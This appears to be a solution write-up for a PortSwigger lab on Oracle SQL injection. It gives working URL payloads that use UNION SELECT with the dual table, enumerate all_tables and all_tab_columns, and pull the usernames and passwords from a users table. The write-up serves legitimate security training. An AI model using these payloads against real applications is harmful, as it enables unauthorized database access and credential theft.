
# SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual


---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:


<img width="1332" height="865" alt="1" src="https://github.com/user-attachments/assets/ed712b73-8c5d-4e28-b91f-7f3f98ed5225" />


We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```


<img width="1515" height="792" alt="2" src="https://github.com/user-attachments/assets/a1996cf9-f1f9-4983-95a8-b2162104ebd1" />


Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Pets'+union+all+select+NULL,NULL+from+dual--
```


List the table names with

```
SELECT table_name from all_tables
```

```
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
```


<img width="1530" height="790" alt="3" src="https://github.com/user-attachments/assets/2bcd217f-cfcc-406b-bfbd-d7788e5d689d" />


The interesting one seems “USERS_OMLYMKE”. 

```
SELECT COLUMN_NAME from all_tab_columns WHERE table_name = 'USERS_OMLYMK'
```

```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+=+'USERS_OMLYMK'--
```


<img width="1532" height="791" alt="4" src="https://github.com/user-attachments/assets/54019e64-b2b0-4070-8ed0-76eb85e74baf" />


Finally:

```
SELECT USERNAME_SRSMIC,PASSWORD_GTCMAT from USERS_OMLYMK
```

```
/filter?category=Pets'+union+all+select+USERNAME_SRSMIC,PASSWORD_GTCMAT+from+USERS_OMLYMK--
```


<img width="1532" height="796" alt="5" src="https://github.com/user-attachments/assets/de73ad4a-e6cc-4605-9f07-83d4342fec66" />

